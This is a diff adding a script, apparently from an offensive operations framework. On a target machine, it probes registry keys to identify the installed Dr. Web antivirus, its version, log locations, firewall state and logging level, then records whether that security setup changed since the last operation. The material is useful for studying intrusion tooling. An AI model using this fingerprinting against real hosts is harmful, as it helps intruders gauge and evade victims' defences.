@@ -1,0 +1,129 @@
+#include the following files - functions you'll need to call
+@include "PSPHelpers.epm";
+@include "PerlFunctions.epm";
+
+#The struct is defined in PSPHelpers.epm, To reduce the number of function calls
+metaData @metaData;
+init(@metaData);
+
+#you now know
+#@metaData.$ip - what the target is being post-processed as
+#@metaData.$ipw - just the ip with 'w' on the end to help look in preps
+#@metaData.$projectName - if one is found in the preps directory
+#@metaData.$driveLetter - where they placed the ops disk, probably d:
+#@metaData.$prepsDir - where preps live, probably d:\OPSDisk\preps
+#@metaData.$history - bool - did we find a pspConfig.txt file in preps
+
+@metaData.$vendor = "Dr. Web";
+
+@echo on;
+@record on;
+echo "Starting Dr. Web configuration check\r";
+@echo off;
+@echo off;
+
+@record on;
+if(`regquery -hive L -subkey "software\\IDAVlab\\InstalledComponents" -value "ProductType"`)
+{
+	@metaData.$version = GetCmdData("value_data");
+	if(@metaData.$version == "AV"){
+	echo "Found registry keys for Dr. Web for Workstations";
+	@metaData.$product = "Dr. Web for Workstations";
+	@metaData.$version = "5";
+	`regquery -hive L -subkey "system\\currentcontrolset\\services\\dwprot\\parameters\\files\\4" -value name`;
+	@metaData.$logFile = GetCmdData("value_data");
+	echo "Log file location: @metaData.$logFile";
+	`grep -mask drweb32.ini -pattern Guard -path "C:\\program files\\DrWeb"`;
+	}
+}
+else if(`regquery -hive L -subkey "software\\IDAVlab\\Enterprise Suite"`)
+{
+	echo "Found registry keys for Dr. Web Enterprise";
+	@metaData.$product = "Dr. Web Enterprise";
+	@metaData.$version = "5";
+	if(`regquery -hive L -subkey "system\\currentcontrolset\\services\\dwprot\\parameters\\files\\4" -value name`){
+	@metaData.$logFile = GetCmdData("value_data");
+	echo "Log file location: @metaData.$logFile";
+	}
+	else if(`regquery -hive L -subkey "system\\currentcontrolset\\services\\dwprot\\parameters\\files\\2" -value name`){
+	@metaData.$logFile = GetCmdData("value_data");
+	echo "Log file location: @metaData.$logFile";
+	}
+
+}
+ 
+if (`regquery -hive L -subkey "SOFTWARE\\IDAVLab\\InstalledComponents" -value "ProductType"`)
+{
+	@metaData.$information = GetCmdData("value_data");
+	echo "Looks like Dr. Web @metaData.$information";
+	@metaData.$product = "Dr. Web @metaData.$information";  
+}
+
+if(`regquery -hive L -subkey "SOFTWARE\\IDAVLab\\Firewall"`)
+{
+	echo "Found registry keys for Dr. Web Firewall";
+	@metaData.$product = "Dr. Web 6 Pro";
+	
+	if(`regquery -hive L -subkey "SOFTWARE\\Doctor Web\\Firewall\\Sys" -value "State"`){
+		string $FWstate;
+		$FWstate = GetCmdData("value_data");
+		if( ($FWstate == "00000001") ){
+			echo "Firewall is ON";
+		} else { 
+			echo("Firewall may be OFF - check HKLM\\SOFTWARE\\Doctor Web\\Firewall\\Sys"); 
+		}
+	}
+}
+
+
+#@metaData.$product  AV, Enterprise, Pro- etc.
+#@metaData.$version - 5.0 - 6.0 - etc.
+#@metaData.$installDate - if you know
+#@metaData.$defUpdates - last time product/virus def's were updated
+#@metaData.$logFile - where are the logs stored
+#@metaData.$quarantine - location of quarantine folder
+#@metaData.$information - place any additional information here
+
+
+`regquery -hive L -subkey "system\\CurrentControlSet\\Services\\DwProt\\Parameters\\Version" -value ""`;
+	@metaData.$version = GetCmdData("value_data");
+
+if (`regquery -hive L -subkey "software\\Doctor Web\\Scanning Engine\\SpIDer Guard\\settings" -value "Log/Verbose"`){
+	string $LogLevel;
+	$LogLevel = GetCmdData("value_data");
+	#echo("$LogLevel");
+	if( ($LogLevel == "00000000") ){
+			echo ("Lowest logging level");}
+	if( ($LogLevel == "00000001") ){
+			echo ("Medium level logging - everything written to disk and which process wrote it");
+						   }
+}
+if (`regquery -hive L -subkey "software\\Doctor Web\\Scanning Engine\\SpIDer Guard\\settings" -value "Log/Debugging"`){
+	string $LogLevel2;
+	$LogLevel2 = GetCmdData("value_data");
+	#echo("$LogLevel2");
+	if( ($LogLevel2 == "00000001") ){
+	echo ("Logs will show debugging info");}
+}
+
+
+#You construct $runningConfig. returns true if equal to the previous ops config, else false
+#checkConfig also calls createConfig under the covers for you.
+
+
+echo "Writing PSP Metadata information to pspInformation.txt";
+#write the human readable file
+writeMetaData(@metaData);
+
+
+echo "Current Version: @metaData.$product (@metaData.$version)";
+init(@metaData);
+
+	if(@metaData.$history){
+		if(checkConfig("Dr.Web: @metaData.$version",@metaData)){
+			echo "\r\rNo change in PSP configs.\r\r";
+		}else{
+			echo "\r\r!!!Changed PSP configs since last time!!!\r\r";
+		}
+	}
+
